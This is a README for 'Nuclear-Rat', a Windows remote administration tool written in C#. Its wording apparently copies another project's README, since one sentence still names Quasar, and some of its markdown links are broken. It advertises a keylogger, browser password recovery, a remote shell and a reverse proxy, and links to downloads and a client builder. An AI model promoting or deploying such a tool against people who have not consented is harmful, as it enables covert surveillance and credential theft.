# Nuclear-Rat

**Free, Open-Source Remote Administration Tool for Windows**

Nuclear-rat-1.8 is a fast and light-weight remote administration tool coded in C#. The usage ranges from user support through day-to-day administrative work to employee monitoring. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you.

## Features
* TCP network stream (IPv4 & IPv6 support)
* Fast network serialization (Protocol Buffers)
* Encrypted communication (TLS)
* UPnP Support (automatic port forwarding)
* Task Manager
* File Manager
* Startup Manager
* Remote Desktop
* Remote Shell
* Remote Execution
* System Information
* Registry Editor
* System Power Commands (Restart, Shutdown, Standby)
* Keylogger (Unicode Support)
* Reverse Proxy (SOCKS5)
* Password Recovery (Common Browsers and FTP Clients)
* ... and many more!

## Download
* https://github.com/blacktopservices/Nuclear-rat/releases/tag/main (recommended)
* [https://github.com/blacktopservices/Nuclear-rat/releases/tag/main)

## Supported runtimes and operating systems
* .NET Framework 4.5.2 or higher
* Supported operating systems (32- and 64-bit)
  * Windows 11
  * Windows Server 2022
  * Windows 10
  * Windows Server 2019
  * Windows Server 2016
  * Windows 8/8.1
  * Windows Server 2012
  * Windows 7
  * Windows Server 2008 R2
* https://github.com/blacktopservices/Nuclear-rat/releases/tag/main

## Compiling
Open the project `Nuclear.sln` in Visual Studio 2019+ with installed .NET desktop development features and [restore the NuGET packages](https://docs.microsoft.com/en-us/nuget/consume-packages/package-restore). Once all packages are installed the project can be compiled as usual by clicking `Build` at the top or by pressing `F6`. The resulting executables can be found in the `Bin` directory. See below which build configuration to choose from.

## Building a client
| Build configuration         | Usage scenario | Description
| ----------------------------|----------------|--------------
| Debug configuration         | Testing        | The pre-defined [Settings.cs]s) will be used, so edit this file before compiling the client. You can execute the client directly with the specified settings.
| Release configuration       | Production     | Start `NuclearRat` and use the client builder.

## Contributing
See [CONTRIBUTING.md](CONTRIBUTING.md)

## Roadmap
See [ROADMAP.md](ROADMAP.md)

## Documentation
Seeusage instructions and other documentation.

## License
Nuclear Rat is distributed under the [MIT License](LICENSE).  
Third-party licenses are located [here](Licenses).

## Thank you!
I really appreciate all kinds of feedback and contributions. Thanks for uzi.
